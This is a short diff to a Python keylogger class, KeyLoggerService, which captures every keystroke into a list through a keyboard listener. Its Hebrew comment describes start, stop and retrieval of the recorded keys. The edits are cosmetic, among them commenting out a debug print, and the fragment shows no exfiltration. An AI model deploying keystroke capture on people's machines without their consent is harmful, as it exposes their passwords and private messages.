@@ -3,7 +3,6 @@ from KeyLogger import IKeyLogger
 #התוכנה שאוספת את הלחיצות ברשימה\הפעלה\כיבוי\בקשה לקבל את הרשימה
 class KeyLoggerService(IKeyLogger):
     def __init__(self):
-    
         self.listener = None
         super().__init__()
     def start_logging(self): 
@@ -26,8 +25,9 @@ class KeyLoggerService(IKeyLogger):
             elif key == keyboard.Key.esc:
                 return False
             else:
-                self.text.append(key)
-                print(self.text)
+                self.text.append((key))
+                # print(self.text)
+
         self.listener = keyboard.Listener(on_press=on_press) 
         self.listener.start()       
         # with keyboard.Listener(
